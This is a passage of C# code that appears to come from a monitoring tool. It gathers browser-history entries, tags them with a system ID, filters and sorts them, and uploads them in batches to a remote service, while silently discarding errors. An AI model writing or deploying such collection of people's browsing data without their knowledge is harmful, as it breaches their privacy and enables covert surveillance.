                    h.LAST_VISIT_DATE = item.ftLastVisited.ToString();
                    h.LAST_VISIT_TIME = item.ftLastVisited.ToString();
                    h.SYSTEM_ID = LoginManagment.SYSTEM_ID;
                    h.BROSWER_ID = 4;
                    hist.Add(h);
                }
                catch (Exception)
                {
                }
            }


            var data = (from s in hist
                        where !s.URL.Contains("http")
                        orderby s.URL
                        select s).ToList();

            ServiceClient client = new ServiceClient();

            for (int i = 0; i < data.Count; i = i + 50)
            {
                var items = data.Skip(i).Take(50);
                if (client.AddChromeHistory(items.ToArray()))
                {

                }
            }
        }
    }
}
